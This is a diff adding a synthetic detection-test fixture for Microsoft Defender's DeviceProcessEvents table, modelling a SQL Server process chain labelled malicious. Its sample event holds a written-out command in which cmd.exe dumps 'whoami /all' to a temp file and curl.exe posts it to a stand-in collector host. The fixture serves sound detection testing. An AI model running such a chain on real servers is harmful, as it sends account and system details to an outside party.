@@ -1,0 +1,23 @@
+{
+  "synthetic": true,
+  "source": "synthetic; https://cloud.google.com/blog/topics/threat-intelligence/artex-and-friends-enter-agentic-offensive-frameworks ; https://threatdefence.com/article/artex-agentic-attack-framework-detection-hunting ; https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table ; https://curl.se/docs/manpage.html ; https://www.gnu.org/software/wget/manual/wget.html",
+  "platform": "defender",
+  "table": "DeviceProcessEvents",
+  "label": "malicious",
+  "variant": "xp_cmdshell-style chain: sqlservr > cmd > curl posts command output",
+  "expect_alert": true,
+  "result": "not run (no KQL runner in this repo). Python mirror of the rule logic applied to these events: alert, matches expectation",
+  "events": [
+    {
+      "Timestamp": "2026-11-26T03:00:00Z",
+      "DeviceId": "synthetic-db01",
+      "DeviceName": "db01.corp.example",
+      "FileName": "curl.exe",
+      "ProcessCommandLine": "curl.exe -s -X POST --data-binary @C:\\Windows\\Temp\\o.txt https://collector.example.net/5f1c2a",
+      "AccountName": "NT SERVICE\\MSSQLSERVER",
+      "InitiatingProcessFileName": "cmd.exe",
+      "InitiatingProcessCommandLine": "cmd.exe /c whoami /all > C:\\Windows\\Temp\\o.txt & curl.exe ...",
+      "InitiatingProcessParentFileName": "sqlservr.exe"
+    }
+  ]
+}
